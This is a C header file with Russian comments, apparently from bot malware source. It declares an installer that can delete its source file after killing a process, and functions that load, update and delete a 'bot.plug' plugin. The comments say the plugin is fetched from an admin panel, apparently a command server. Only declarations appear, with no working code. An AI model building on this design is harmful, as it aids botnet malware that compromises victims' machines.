//-----------------------------------------------------------------------------
//  Модуль инсталяции бота
//-----------------------------------------------------------------------------
#ifndef InstallerH
#define InstallerH
//-----------------------------------------------------------------------------

#include "Strings.h"

//----------------------------------------------------
//  Install - Функция инсталирует бота
//
//  IsUpdate - Признак того, что идёт обновление бота
//             а не первая инсталяция
//
//  DeleteSourceFile - Удалять ли исходный файл
//
//  SourceFileProcessPID - PID процесса, котрый
//                         необходимо завершить перед
//                         удалением исходного файла
//----------------------------------------------------
BOOL WINAPI Install(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID);




//**************************************************************
//        Методы для работы с плагином бота bot.plug
//**************************************************************


//----------------------------------------------
//  LoadBotPlug - Функция загружает плагин
//
//  Если плагин есть на диске, то он загружается
//  с диска. В противном случае плагин загру-
//  жается с админки и промежуточно сохраняется
//  на диске
//----------------------------------------------
BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize);


//----------------------------------------------
//  DeleteBotPlug
//  Функция обновляет плагин
//----------------------------------------------
BOOL WINAPI DeleteBotPlug();

//----------------------------------------------
//  UpdateBotPlug 
//  Функция обновляет плагин
//----------------------------------------------
BOOL WINAPI UpdateBotPlug();


//----------------------------------------------
//  FreeBotPlug - Функция освобождает память
//                выделенную под плагин
//
//  Добавлено для dll ядра
//----------------------------------------------
VOID WINAPI FreeBotPlug(LPVOID Buf);




//-----------------------------------------------------------------------------
#endif
